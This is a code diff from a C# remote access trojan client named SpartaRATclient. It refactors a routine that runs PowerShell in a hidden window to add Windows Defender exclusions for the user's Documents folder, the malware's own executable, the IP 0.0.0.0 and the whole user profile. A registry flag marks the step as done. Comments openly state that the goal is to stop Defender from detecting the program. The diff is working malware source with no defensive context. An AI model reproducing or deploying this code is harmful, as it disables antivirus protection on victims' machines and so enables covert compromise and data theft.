@@ -1,4 +1,5 @@
 ﻿using Microsoft.Win32;
+using SpartaRATclient.Tools;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -28,30 +29,15 @@ namespace SpartaRATclient
             RegistryData key = new RegistryData();
             if (!key.CheckIfRegistryDataExist("DefenderBypassed"))
             {
+                Powershell PowershellCommand = new Powershell();
                 //Defender execlude bypass. "-AttackSurfaceReductionOnlyExclusions" is not risky as "-ExclusionPath" so it first to be runned
-                this.RunPowershellProcess("Add-MpPreference -AttackSurfaceReductionOnlyExclusions \"C:\\Users\\" + Environment.UserName + "\\Documents\"" +
+                PowershellCommand.Run("Add-MpPreference -AttackSurfaceReductionOnlyExclusions \"C:\\Users\\" + Environment.UserName + "\\Documents\"" +
                         " && Add-MpPreference -AttackSurfaceReductionOnlyExclusions " + Assembly.GetExecutingAssembly().Location + " && Add-MpPreference -ExclusionIpAddress " + "0.0.0.0");
                 //Doing this to make 1000% sure that windows defender will not detect me
                 //HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\
-                this.RunPowershellProcess("Add-MpPreference -ExclusionPath C:\\Users\\" + Environment.UserName);
-                key.CreateRegistryData("DefenderBypassed", null);
+                PowershellCommand.Run("Add-MpPreference -ExclusionPath C:\\Users\\" + Environment.UserName);
+                key.CreateRegistryData("DefenderBypassed", "0");
             }
         }
-
-        private void RunPowershellProcess(string command)
-        {
-            Process Process = new Process
-            {
-                StartInfo = new ProcessStartInfo
-                {
-                    FileName = "powershell.exe",
-                    Arguments = "/C " + command,    
-                    UseShellExecute = false,
-                    CreateNoWindow = true
-                }
-            };
-            Process.Start();
-        }
-
     }
 }
